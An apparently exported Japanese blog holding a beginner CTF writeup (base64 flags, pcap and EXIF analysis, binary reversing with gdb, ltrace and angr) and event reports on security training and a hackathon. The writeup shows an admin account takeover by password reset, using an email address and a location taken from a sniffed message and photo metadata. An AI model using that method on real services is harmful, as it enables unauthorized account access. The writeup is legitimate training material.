HTTP/1.1 200 OK\nDate: Thu, 14 Jul 2016 14:28:30 GMT\nServer: Apache/2.4.20 (Debian)\nLast-Modified: Thu, 14 Jul 2016 14:21:21 GMT\nETag: \"35-537993754cce4\"\nAccept-Ranges: bytes\nContent-Length: 53\nContent-Type: text/plain\n\nY3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9\nn\n```\n\nこの文字列、講義で習ったbase64っぽくないですか？\nということでデコードしてみます。\n\n```sh\n# echo Y3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9 | base64 -d\nctf4b{536dac371aa652f865c20abe7b4094db}\n```\n\n### ラクをする\n\nまぁとりあえずstringsします！！！\n\n```sh\nstrings for200-2\n```\n\nそしたらbase64っぽい文字列が見えてしまったのでデコードしたらFLAGでした。\n（なんかbase64ってなんとなくわかりますよね）\n\n## adminでログインしろ！ (Forensics 300)\n\npcapとサービスのURLが渡されます。\n\nとりあえずSQLインジェクションとか試して見るんですけど、(まぁForensicsだし)ダメでした。\nで、よく見るとパスワードリセットができるようになっています。\nが、リセットしようとするとメールアドレスと郵便番号を入力しろと言われます。\n\nということで、サービス管理者の通信を盗聴したっぽいpcapを見に行きます。\nとりあえず脳死stringsしましたが成果がなかったので、Wiresharkを使って講義で習ったヤツをやってみました。\n\nWiresharkの統計＞プロトコル階層を見てみたところ、\nなんか大量の通信の中にちょっとだけSMTP(メール送信)の通信が記録されていました。\n（少ないやつは怪しいって講義で習いました。）\n\nで、この通信を覗いてみる(講義で習ったFollow TCP Stream)と、\nどうやら管理者と思しきアドレスから、画像つきで「引っ越しました！」みたいなメールを送っていました。\n\n```\n220 4a256f335dbb Python SMTP proxy version 0.2\nehlo debian.debian\n502 Error: command \"EHLO\" not implemented\nhelo debian.debian\n250 4a256f335dbb\nmail FROM:<admin@poe.ctf4b>\n250 Ok\nrcpt TO:<john@poe.ctf4b>\n250 Ok\ndata\n354 End data with <CR><LF>.<CR><LF>\nContent-Type: multipart/mixed; boundary=\"===============1980392290290904787==\"\nMIME-Version: 1.0\nTo: john@poe.ctf4b\nFrom: admin@poe.ctf4b\nSubject: 引越しました\n\n--===============1980392290290904787==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 8bit\n\n\n会津若松に引越しました.\nお近くにお越しの節はどうぞお気軽にお立ち寄り下さい.\n\n新居から見える景色を画像で添付します.\n\n\n--===============1980392290290904787==\nContent-Type: image/jpeg\nMIME-Version: 1.0\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"./keshiki.jpg\"\n\n<<<略>>>\n--===============1980392290290904787==--\n.\n250 Ok\nquit\n221 Bye\n```\n\nとりあえずこれで管理者のメールアドレス`admin@poe.ctf4b`は手に入ったので、次はメールに添付されている画像です。\n画像はbase64化されてメールにくっついているので、デコードしてみるんですが、見ても写っているのが何処かなんてピンと来ません。\n\nじゃあ、ということで講義で紹介されたexiftoolでEXIFを見ると……\n撮影した位置情報(GPS Position)がバッチリ残っていました。\n\n```sh\n# exiftool -GPSPosition keshiki.jpg\nGPS Position                    : 37 deg 29' 54.83\" N, 139 deg 56' 9.00\" E\n```\n\nこのGPS座標をGoogleMapとかに入れれば大体の場所がわかるので、あとは適当にググって郵便番号を割り出します。\nで、この2つの情報でパスワードリセットすればログインしてFlagが見れます。\n\n## Welcome Reversing World! (Reversing 100)\n\n実行すると`Enjoy CTF!`って出てきて終わります。\n\nバイナリがいきなりstrippedで読むのが辛い＞＜\n頑張って読むと、`Enjoy CTF!`を表示するちょっと手前に、なんか怪しいことをしてます。\n\n```x86asm\n 804841c:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048423:   c7 45 f4 e0 84 04 08    mov    DWORD PTR [ebp-0xc],0x80484e0\n 804842a:   83 7d f0 00             cmp    DWORD PTR [ebp-0x10],0x0\n 804842e:   74 10                   je     8048440 <__libc_start_main@plt+0x150>\n 8048430:   83 ec 0c                sub    esp,0xc\n 8048433:   ff 75 f4                push   DWORD PTR [ebp-0xc]\n 8048436:   e8 a5 fe ff ff          call   80482e0 <puts@plt>\n```\n\nC言語っぽく書けば\n```c\nint num = 0;\nchar* flag = 0x80484e0;\nif(num != 0){\n   puts(flag);\n}\n```\n\nみたいなカンジですね。\nまぁどう考えてもif文の中が実行されるワケがないですね。\nでもアドレスがわかるので、ココを見れば表示されるはずの文字列がわかります。\n\n`0x80484e0`は.rodataセクションの中なので、\n\n```sh\n# objdump -s -j.rodata bin100\n\nbin100:     file format elf32-i386\n\nContents of section .rodata:\n 80484d8 03000000 01000200 63746634 627b3537  ........ctf4b{57\n 80484e8 72316e36 355f6330 6d6d346e 645f6631  r1n65_c0mm4nd_f1\n 80484f8 6e645f66 6c34367d 00456e6a 6f792043  nd_fl46}.Enjoy C\n 8048508 54462100                             TF!.\n```\n\nありました。\n\n### ラクをする\n\n脳死stringsで見つかってしまった\n```sh\nstrings bin100\n```\n\n作問者さんによる解説でもstringsが想定解って言ってました(?)\n\n## Lecture Review (Reversing 200)\n\n与えられたバイナリの指定された部分(nopで囲まれたところ)を抜けると`%eax`の値はいくつになっているか？\n講義の演習でやった計算をやってみよう！ってやつですね。\n\nがんばって読んで計算するだけです。\n\n### ラクをする\n\ngdbを使うとちょっとラクできます。\n\n```sh\n# gdb -q ./bin200_1\nReading symbols from ./bin200_1...(no debugging symbols found)...done.\n(gdb) disas main\nDump of assembler code for function main:\n   0x08048416 <+0>:  push   ebp\n   0x08048417 <+1>:  mov    ebp,esp\n   0x08048419 <+3>:  sub    esp,0x10\n   0x0804841c <+6>:  nop\n   0x0804841d <+7>:  nop\n   0x0804841e <+8>:  mov    DWORD PTR [ebp-0xc],0x14\n   0x08048425 <+15>: mov    DWORD PTR [ebp-0x8],0x8\n   0x0804842c <+22>: mov    DWORD PTR [ebp-0x4],0xfffffffd\n   0x08048433 <+29>: push   DWORD PTR [ebp-0x4]\n   0x08048436 <+32>: push   DWORD PTR [ebp-0x8]\n   0x08048439 <+35>: push   DWORD PTR [ebp-0xc]\n   0x0804843c <+38>: call   0x80483db <calc>\n   0x08048441 <+43>: add    esp,0xc\n   0x08048444 <+46>: mov    ds:0x804a01c,eax\n   0x08048449 <+51>: mov    eax,ds:0x804a01c\n   0x0804844e <+56>: nop\n   0x0804844f <+57>: nop\n   0x08048450 <+58>: mov    eax,0x0\n   0x08048455 <+63>: leave\n   0x08048456 <+64>: ret\nEnd of assembler dump.\n(gdb) b*0x0804844e\nBreakpoint 1 at 0x804844e\n(gdb) r\nStarting program: /media/sf_share/bin200_1\n\nBreakpoint 1, 0x0804844e in main ()\n(gdb) i r\neax            0xffffffe5\t-27\necx            0xd4024da0\t-738046560\nedx            0xffffffe8\t-24\nebx            0x0\t0\nesp            0xffffdc18\t0xffffdc18\nebp            0xffffdc28\t0xffffdc28\nesi            0x1\t1\nedi            0xf7fc6000\t-134455296\neip            0x804844e\t0x804844e <main+56>\neflags         0x296\t[ PF AF SF IF ]\ncs             0x23\t35\nss             0x2b\t43\nds             0x2b\t43\nes             0x2b\t43\nfs             0x0\t0\ngs             0x63\t99\n```\n\n## Not Print FLAG (Reversing 200)\n\n渡されたバイナリを動かすと\n`Sorry. I forgot to display the FLAG. This message is not FLAG.`\nって言われて終わります。\n\n（strippedなのでつらいのですが＞＜）バイナリをよく読んでみると、\nなんだか怪しいことをしてる部分が見つかります。（↑を表示するちょっと手前の部分です）\n```x86asm\n 8048471:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048478:   eb 11                   jmp    804848b <putchar@plt+0x13b>\n 804847a:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804847d:   8b 04 85 40 a0 04 08    mov    eax,DWORD PTR [eax*4+0x804a040]\n 8048484:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax\n 8048487:   83 45 f0 01             add    DWORD PTR [ebp-0x10],0x1\n 804848b:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804848e:   83 f8 19                cmp    eax,0x19\n 8048491:   76 e7                   jbe    804847a <putchar@plt+0x12a>\n```\n\nどこかから何かを読んで`ebp-0xc`へ格納していますが、読み出した値は使ってませんね。\nあー！_forgot to display_ってそういうことか！\n\nで、読み出し元の`0x804a040`というのは.dataセクションなので、ココを見ると……\n```sh\n# objdump -s -j.data ./bin200_2\n\n./bin200_2:     file format elf32-i386\n\nContents of section .data:\n 804a020 00000000 00000000 00000000 00000000  ................\n 804a030 00000000 00000000 00000000 00000000  ................\n 804a040 31000000 6e000000 37000000 5f000000  1...n...7..._...\n 804a050 76000000 34000000 6c000000 75000000  v...4...l...u...\n 804a060 33000000 5f000000 33000000 71000000  3..._...3...q...\n 804a070 75000000 34000000 6c000000 5f000000  u...4...l..._...\n 804a080 63000000 68000000 34000000 72000000  c...h...4...r...\n 804a090 34000000 63000000 37000000 33000000  4...c...7...3...\n 804a0a0 72000000 00000000                    r.......\n```\n\nそれっぽいのが見つかりました。\n\n## Encrypted FLAG (Reversing 300)\n\nFLAGを入力するとそれが正解かどうかを判定してくれるバイナリです。\n\n.dataセクションになにやらそれっぽい`flag`っていう変数があります。\n\n```\n(gdb) x/s 0x804a02c\n0x804a02c <flag>:\t\"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\"\n```\n\nどうやら暗号化されているようで、そのままでは読めないです。\n\nバイナリを読んでみると、`flag`を`decrypt`という関数で変換して、そのデータをstrcmpで入力と比較しています。\n\n実際にflagを変換している部分がココ\n```x86asm\n 8048558:   83 c4 10                add    esp,0x10\n 804855b:   83 ec 04                sub    esp,0x4\n 804855e:   6a 42                   push   0x42\n 8048560:   6a 1e                   push   0x1e\n 8048562:   68 2c a0 04 08          push   0x804a02c\n 8048567:   e8 73 00 00 00          call   80485df <decrypt>\n 804856c:   83 c4 10                add    esp,0x10\n 804856f:   83 ec 04                sub    esp,0x4\n 8048572:   6a b7                   push   0xffffffb7\n 8048574:   6a 1e                   push   0x1e\n 8048576:   68 2c a0 04 08          push   0x804a02c\n 804857b:   e8 5f 00 00 00          call   80485df <decrypt>\n```\n\n講義でやった関数呼び出しの話を思い出すと、\nどうやら`decrypt`に`flag`のアドレス、何らかの値①、何らかの値②を順番に渡しています。\n\n`0x804a02c`がflagのアドレスなので、C言語っぽく書いてみると、\n```c\ndecrypt(flag, 0x1e, 0x42);\ndecrypt(flag, 0x1e, 0xffffffb7);\n```\nこの0x1e、`strlen(flag) == 0x1e`なので、どうやらflagの長さっぽいですね。\n\nで、`decrypt`が何をしているかというと、\n\n```x86asm\n080485df <decrypt>:\n 80485df:   55                      push   ebp\n 80485e0:   89 e5                   mov    ebp,esp\n 80485e2:   83 ec 14                sub    esp,0x14\n 80485e5:   8b 45 10                mov    eax,DWORD PTR [ebp+0x10]\n 80485e8:   88 45 ec                mov    BYTE PTR [ebp-0x14],al\n 80485eb:   c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0\n 80485f2:   eb 1c                   jmp    8048610 <decrypt+0x31>\n 80485f4:   8b 55 fc                mov    edx,DWORD PTR [ebp-0x4]\n 80485f7:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 80485fa:   01 c2                   add    edx,eax\n 80485fc:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]\n 80485ff:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 8048602:   01 c8                   add    eax,ecx\n 8048604:   0f b6 00                movzx  eax,BYTE PTR [eax]\n 8048607:   32 45 ec                xor    al,BYTE PTR [ebp-0x14]\n 804860a:   88 02                   mov    BYTE PTR [edx],al\n 804860c:   83 45 fc 01             add    DWORD PTR [ebp-0x4],0x1\n 8048610:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]\n 8048613:   3b 45 0c                cmp    eax,DWORD PTR [ebp+0xc]\n 8048616:   7c dc                   jl     80485f4 <decrypt+0x15>\n 8048618:   90                      nop\n 8048619:   c9                      leave\n 804861a:   c3                      ret\n```\n\nこうなので、C言語っぽく書くとこうでしょうか？\n```c\nvoid decrypt(char* flag, int len, int num){\n\tfor(int i = 0; i < len; i++){\n\t\tflag[i] ^= num;\n\t}\n}\n```\n\nじゃあ、`flag`を実際に復号してみます。\n```c\n#include <stdio.h>\n\nchar flag[] = \"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\";\n\nvoid decrypt(char* flag, int len, int num){\n   for(int i = 0; i < len; i++){\n      flag[i] ^= num;\n   }\n}\n\nint main(){\n   decrypt(flag, 0x1e, 0x42);\n   decrypt(flag, 0x1e, 0xffffffb7);\n   puts(flag);\n   return 0;\n}\n```\n\nイケました！\n\n### ラクをする\n\nstrcmpで比較するために、実行中にメモリにFLAGが乗っているはずなので、gdbで探してみます。\nstrcmpの直前でブレークして`flag`を見てみると、\n\n```sh\n# gdb -q ./bin300\nReading symbols from ./bin300...(no debugging symbols found)...done.\n(gdb) b*0x0804858f\nBreakpoint 1 at 0x804858f\n(gdb) x/s 0x0804a02c\n0x804a02c <flag>: \"ctf4b{xor_xor_simple_crypt!!}\"\n```\n\n### もっとラクをする\n\n`ltrace`っていう便利なモノがあります。\nコレを使うと、ライブラリ関数の呼び出しをトレースできます。\nつまり、strcmpに何を渡しているのかが見えます。\n\n```sh\n# ltrace ./bin300\n__libc_start_main(0x804851b, 1, 0xff932834, 0x8048620 <unfinished ...>\nprintf(\"Please input flag... \")                                      = 21\n__isoc99_scanf(0x80486b6, 0xff93273c, 0xff932740, 0x80482a9)         = 0xffffffff\nstrcmp(\"\\024\", \"ctf4b{xor_xor_simple_crypt!!}\")                      = -1\nputs(\"Wrong flag...\")                                                = 14\n+++ exited (status 0) +++\n```\n\n### おまけ\n\nangrを使ってみる\n\n```python\n# python2\n>>> import angr\n>>> p = angr.Project(\"./bin300\", load_options={\"auto_load_libs\":False})\n>>> state = p.factory.blank_state(addr=0x804851b)\n>>> path = p.factory.path(state)\n>>> pg = p.factory.path_group(path)\n>>> e = pg.explore(find=0x80485a7, avoid=0x80485b9)\n>>> e.found[0].state.posix.dumps(0)\n'ctf4b{xor_xor_simple_crypt!!}\\x00\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n","title":"CTF for ビギナーズ 2016 金沢 に行った (writeup)","image":null,"tags":["CTF","CTF4b","参加記"],"date":"2016-11-27T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/78/","publisher":"東京工業大学デジタル創作同好会traP","title":"TWCTF 2016 writeup","tags":["traP","CTF","セキュリティ","参加記"],"date":"2016-09-06T00:00:00.000Z"},{"type":"article","slug":"10","body":"行きました。\n\n# SANS Netwars とは\n\n米国SANSの強い講師の方による強い講義を受けて、\n翌日CTFでさっそく学んだことを活かそう！！！みたいなイベントです。\n\nタダでハイクオリティな講義が受けられてしかもいろいろグッズが貰える！！！神か！！！\n\n## 講義\n\n英語なのでツラみがある。\nでも同時通訳がついてるので安心！日本語で質問もできるよ！！\n\n詳しい内容を書いてしまうとめっちゃ怒られてしまうので、とても良かったよ、とだけ。\n\n## 懇親感\n\n1日目の夜には懇親会があります。\n食事がスゴイ豪華な上にお酒まで飲めます。NRI Secureの財力を感じる……！\n\nボクは交流そっちのけでタダ飯を食って、人に心配されるレベルまでタダ酒を飲んでました（クズ）\n\n## CTF\n\nCTFがやりたくて参加したみたいなところがある。\nこれも詳細を喋ると消されるので、楽しかったよ、とだけ。\n\nスコアボードが常にスクリーンに映しだされてて、順位の入れ替えがビュンビュン表示されててめっちゃカッコいいです。\nFLAGをsubmitして、自分の順位がグーンって上がるのを見るのがめちゃめちゃ楽しいです。\n\n最終結果\n\nhttps://twitter.com/TimMedin/status/766901031003299841\n\nボクは2位でした。\n\nhttps://twitter.com/sekai67/status/766905677621047296\n\n# 楽しかった！！！！\n\nNRI SecureとSANSは神\n\nみんな参加しよう！！！\n","title":"SANS Netwars 2016に行った","image":null,"tags":["CTF","SANS Netwars","セキュリティ","参加記"],"date":"2016-08-22T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"9","body":"行ってきました。\nセキュリティキャンプに応募した話もあります↓\n\n[セキュリティキャンプに応募した話](/posts/3/)\n\nなんか微妙に日が空いてしまったので最初の方とかもう空覚えなんですが、思い出しながら。\n\n# 一日目\n\n海浜幕張から5分位歩いてクロスウェーブ幕張に到着。\nなんかTwitterみてるとクソ早くに到着して付近散策してらっしゃる参加者さんもいましたが、\nまぁ普通に定刻に付けば大丈夫そう。\n\n![](1.jpg)\n\n会場入りしたら名刺交換タイムでした。\n強そうな人たちから次々と「名刺交換して頂けませんか」と声をかけられます＞＜\n\nhttps://twitter.com/security_camp/status/762848234498699264\n\nで、お昼を食べたり開講式でありがたいお言葉を頂いたりして、講義です。\n\n## セキュリティ基礎\n\nいきなりグループディスカッションです。自己紹介をしつつ、「セキュリティ・キャンプ応募フォームの問題点」を考えました。\n\nhttps://twitter.com/security_camp/status/762909216008867840\n\n## 特別講演「ZENIGATAになりたくて」\n\nめっちゃ面白かったです。\nCyberDefenceとICPOはなんで協力関係にあるのか？みたいな話から、\nICPOのサイバー部門の仕事について、そして「技術」とは何かみたいなお話。\nなんかこのお話を聞けただけでもキャンプに来た甲斐があった気がします。\n\n「CTFでBinaryができる人は大抵Webもできるが、逆はない」とおっしゃられていたのが刺さりました＞＜\n精進します。。。\n\nhttps://twitter.com/security_camp/status/762912661927407616\n\n## 特別講演「サイバー犯罪の実態とこれに対処するための取組」\n\nサイバー犯罪に対する警察の取組みについて。\nこういう分野に関して警察が何やってるのかって、なかなか表に出てこないので、目からウロコでした。\nあと間仁田さんの話し方が面白いです。\n\nhttps://twitter.com/security_camp/status/762928020537483264\n\n# 2日目\n\nいよいよ専門講座！\n\n## [1,2-E] TLS徹底演習\n\nTLSとは何か、TLSは何故必要なのか、といったお話から始まりました。\n**徹底**演習の名の如く、これ以上ないくらい詳しく解説して頂きました。\n\nで、TLSのハンドシェイクはどんな物なのかを一つ一つ見ながら、簡単な演習を行いました。\nペアになって手でTLSのハンドシェイクを作ってメッセージ交換したり、\n間に人を挟んで人力MITM攻撃をしてみたり、楽しかったです。\n\nこの講義は集中講義なので丸一日を使うのですが、\n午後に入った段階で漸く「TLSを理解する**準備**」に入るので、ちょっとビビりました。\nTLSは多くの要素技術を組み合わせてやっと成り立つものらしいので、徹底的に解説するには時間がかかるのも納得です。\n\n理解する準備が終わったら、実際にNode.jsで最新の暗号方式ChaCha20-Poly1305の実装を行いました。\nコレ、つい2ヶ月前に仕様化が完了したばかりの本当に最先端の技術なので、こんな講義を受けられる場所はここしかない！そうです。\n\n大津先生は「どうせ誰も演習を最後まで終えられないだろう」と仰っていましたが、\nボクはNode.jsがスキなので楽しくサクサク演習を進めて、あと1題(!)で終わるトコロまできたのですが、残念ながらタイムアップ。\n大津先生は何故か安堵されていました(笑)\n\nhttps://twitter.com/security_camp/status/763175036786049025\n\n講義の資料は先生がWebにアップしてくださっていますので、以下から見れます。\n\n[こちら](https://speakerdeck.com/shigeki/tlsche-di-yan-xi)\n\n## CTF\n\n待ちに待ったCTF！\nセキュリティに興味を持ったきっかけがCTFなので、もうコレが一番の楽しみでした。\n\nhttps://twitter.com/sekai67/status/763312140350480384\n\nボクらE4gleJumpもガンバるよ！\n\n19:00からの予定でしたが、機材トラブルで30分ほど遅れてのスタート。\nこういうイベントでは（特にネットワーク関係の）機材トラブルがあるあるですね。\n\nhttps://twitter.com/security_camp/status/763325426198466560\n\nこのCTF、「はいコレ、RaspberryPiで動いてるサーバね」ってIPアドレス渡されて放り出されます。\nなんか、この時点でもうだいぶ困惑してるチームもあったようです。\n\n幸いボクらのチームにはRaspiのプロ👏がいたので、\n彼が開始即ポートスキャンでSSHが空いてることを突き止め、\nRaspiのデフォルトユーザとパスワードで一瞬にしてFLAG入手キメててビビりました。\n（SSHでログインできないと次に進めないので、けっこうツラかったですね。）\n\nボクはまぁ、例によってWeb問をチマチマいじってました。\nベーシックなXSSと、PHPのプロトコルラッパーを悪用する問題を解きました。\n後で聞いたところ、どこかに任意コード実行の脆弱性が仕込まれてたようなんですが、全く分からず詰み。\n\nボクがWebで無駄に足掻いてる最中にも、チームのプロ👏各位によってPPCとかCryptoがバシバシ解かれて……\n\nhttps://twitter.com/security_camp/status/763353399806955525\n\n講師チームを除けば**1位**でした。\n（途中までは真に1位だったのに……あと1問解けば……ちょっと悔しいです）\n\nhttps://twitter.com/sekai67/status/763362094003609600\n\n賞状をいただきした。\n副賞としてNTTデータさんからQuoカードも頂きました。\n\nhttps://twitter.com/security_camp/status/763520642503151616\n\n# 3日目\n\n## [3-A] Webアプリケーションの脆弱性の評価と発見\n\n脆弱性を探すときにどんなトコロに注目すべきかを教えていただき、\nその後サイボウズオフィスの旧バージョンから実際に脆弱性を探してみるなどしました。\n見つけた脆弱性の評価方法なども、大変ためになりました。\n\nhttps://twitter.com/security_camp/status/763533821081899008\n\n## [4-C] オンラインゲーム アタック＆ディフェンスチャレンジ\n\n運営チームとプレイヤーチームに分かれて、運営はチート対策、プレイヤーはRMTをガンバる競技です。\n2試合あったのですが、事前アンケートでNodeそこそこ触ってますって回答したせいか1回目も2回目も運営でした。\n\nマップ上に湧くカエルを捕まえて経験値を稼いでレベルを上げるっていうシンプルなオンラインゲームです。\nレベルを上げてRMTするとプレイヤーの得点になります、ゲームを安定運用すると運営の得点になります。\n\n1回目はゲームに予め仕込まれていたバグの修正が遅れて、プレイヤーにやりたい放題されてしまいました。（かなしい）\n大差をつけられてしまったので、2回戦に向けて自動BANスクリプトを書くなどしていました。\n\n2回目、満を持して自動BANスクリプトを投入したのですが、どうも不調でRMTの疑いのないアカウントまでBANしてしまい大幅減点を食らう。（ごめんさない）\n仕方がないので、プレイヤーの自動化スクリプトを阻止すべく全ての動作に1秒の遅延を入れてレベルアップ効率を大幅に下げる作戦に出ました。\nコレが功を奏してRMTは減速、見かけ上安定した運営がなされて結果勝てたんですけど、プレイヤーからめっちゃ叩かれました。\n（現実のオンラインゲームでも運営はしばしばプレイヤーに叩かれてますよね……）\n\nチームで協力して問題を対処していく感じがとても楽しかったですね！\n\nhttps://twitter.com/security_camp/status/763629287173873664\n\n## [5-A] サーバ運用におけるパスワード管理\n\nディスカッションが主でした。\n大学のサークルが所有するサーバを管理したりしてるので、いろいろ勉強になりました。\nディスカッションって苦手なのですけど、自分が思いもしなかったような見方があったりして、いろいろ発見があります。\n\nhttps://twitter.com/security_camp/status/763690313210736640\n\n# 4日目\n\n## [6,7-E] インフラセキュリティブートキャンプ\n\nTerraformを使ってAWS上にシステムを構築してみる演習です。\nAWSはEC2とS2くらいしか使ったことがなかったんですが、VPCを使ったりELBを使ったり……途中めちゃめちゃ詰まりましたがなんとか構築できました。\nTerraformはJSONでシステムの構成を記述してコマンド一発で構築しちゃおうってノリのソフトなんですが、（使いこなせれば）めっちゃ強いなと思いました。\n\nコレも集中講義なんですが、午後はちょっと趣向を変えてDockerでいろんなOSSを走らせてみたりだとか、\nAWS Lambdaを使ってサーバレスアーキテクチャを体験してみたりだとか。\n\n手を動かす部分が多くて楽しかったです。\n\nhttps://twitter.com/security_camp/status/763927629346906112\n\n## グループワークの準備\n\n**闇 of 闇**\n\n一応グループワークの準備時間が毎日1～2時間くらいあったんですが、\n足りるはずもなく毎年恒例（らしい）徹夜進捗会に突入です。\n\nhttps://twitter.com/sekai67/status/764074021973471232\n\nなんかうちのグループは深夜4時位まで議論してました。\n議論し過ぎて話が広がりすぎて全員が分けわからなくなった結果、まとまりのない感じの主張になってしまいました……（反省）\n\n# 5日目\n\n## 起床トラック\n\n毎日ちょこちょこチューターさんに起こされる参加者さんがいたそうですが、\nボクは大丈夫ですよ！もちろん5日目を恥を晒すようなことはしていません！寝てないからね！（白目）\n\n## グループワーク発表\n\nみなさんクオリティが高い＞＜\n個人的に一番おもしろいなぁと思ったのは「一対三」さんのYouTuberの話です。\n\nhttps://twitter.com/security_camp/status/764280337169981440\n\n## 成果発表\n\nいきなり指名されたのでかなりキョドりました。（すみません）\nTLS徹底演習について簡単に説明したのですが、あの講義のスゴさを1割も伝えられなかった……\n\nhttps://twitter.com/security_camp/status/765064661205004290\n\n## おわり\n\n閉講式で修了証書をもらって、記念撮影をしておしまいです。\n5日間、あっという間でした。\n\n記念撮影の掛け声が「がんばるぞい！」だったの、一体なんなんでしょうね（すっとぼけ）\n\nhttps://twitter.com/security_camp/status/764694544092794881\n\n閉講式後、技術書がたくさんもらえます。\n魅力的な本がたくさんあったのですが、受け取る順番を決めるクジで**最下位**を引いたために、残念ながら欲しい本を手に入れることができず。\nロビーでもらったばかりの本を持ち寄ってサイン会が開かれているのを遠目に見てました……。\n\nhttps://twitter.com/security_camp/status/764662954834796544\n\nあ、キャンプ中は飲料水のペットボトルが（ほぼ）無限に配布され、至る所に転がっているんですが、\nボクはその余りをバックに入る限り詰め込んで持ち帰ってきました。（害悪）\n\n# 振り返って\n\nなかなか他ではできない経験ができましたし、参加できて良かったです。\n\nセキュキャンはいいぞ\n\n## もらったもの一覧\n\n![](2.jpg)\n","title":"セキュリティ・キャンプ全国大会2016に行った","image":null,"tags":["CTF","セキュリティ","セキュリティ・キャンプ","参加記"],"date":"2016-08-17T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"7","body":"[Hack U 東京工業大学 2016](http://hacku.yahoo.co.jp/titech2016/)に出ました。\n\n[Hack U 東京工業大学 2016](http://hacku.yahoo.co.jp/titech2016/)\n\n> プログラミングやデザインを通して、あなたのアイデアを形にしてみませんか？\n> Hack U（ハック・ユー）は、学生のための「ものづくり体験イベント」です。\n\n> Hackとは、創意工夫のこと。\n> 世界中のYahoo!で開催されている開発コンテスト\"Hack Day\"をベースに、ヤフーと教育機関が共同開催しているのが\"Hack U\"です。\n\nもう1月も前のことですが、行ってきました。\n\n![](1.jpg)\n\nテーマは「チーム活動に関する何か」で、\n開発時間は24時間†きっかり†です。\n\n# 何を作ろうか？\n\nボクらのチームですが、とりあえず何を作るかだけ前もって決めとこうというコトで、話し合ってたんですが、\nなんか凡庸なアイデアばかりで、HackUでウケそうなネタが浮かんでこないんですよね。\n\nみんながアイデア出しに飽きてきた頃\n\n！？\n\nじゃあこういう退屈な会議を改善するプロダクトはどうだろう？\nということで[@kotarou777775](https://twitter.com/kotarou777775)くんが**強い**案を出してくれました。\n\n何を作ったかの具体的な説明は、あとで。\n\n# 開発1日目 (6/10)\n\nこれはハッカソンあるあるなんですが、開発初日は何故か余裕綽々なんですよね。\nなんか行けそうな気がする、むしろ行ける気しかしない。\n\n![](2.jpg)\n\nこんな感じで開発に使う物品を大学のお金で買ってもらえます。スゴイ。\n\n![](3.jpg)\n\nボクらはKinectを買ってもらいました。\n\n俄然上がるテンション。\n\n![](4.jpg)\n\nKinectのテストをするチームメイト。\n\n途中、Yahoo! JAPANの社内見学をさせてもらいました。\n働きやすそうな会社だなと思いました。（小並感）\n\nこんな様子で1日目はふわっと終了。\n\n![](5.jpg)\n\nラーメンを食べに行きました。一風堂です。\n\n\n# 開発2日目 (6/11)\n\n午前中は昨日と同じ雰囲気でのんびりしてました。\n知り合いのチームにちょっかいを出しに行ったり。\n\n![](6.jpg)\n\nハッカソンのお供ですね。\nどっちも[@0213_ryota](https://twitter.com/0213_ryota)くんにもらいました。神。\n\nそしてお昼を食べ終わった頃、進捗を確認して、\n「_アレ、大丈夫かコレ！？_」となるまでがお約束ですね。\n\n- 主要な機能である音声認識の精度がなんか微妙\n- 